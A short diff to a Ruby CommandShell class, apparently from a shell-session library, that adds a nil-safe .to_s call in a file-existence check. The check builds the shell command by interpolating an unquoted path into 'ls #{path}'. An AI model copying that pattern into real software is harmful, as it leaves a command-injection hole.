@@ -347,7 +347,7 @@ class CommandShell
     # /etc/passwd
     # $ ls /etc/nosuchfile
     # ls: cannot access '/etc/nosuchfile': No such file or directory
-    result = shell_command_token("ls #{path}").strip
+    result = shell_command_token("ls #{path}").to_s.strip
     if result.eql?(path)
       return true
     end
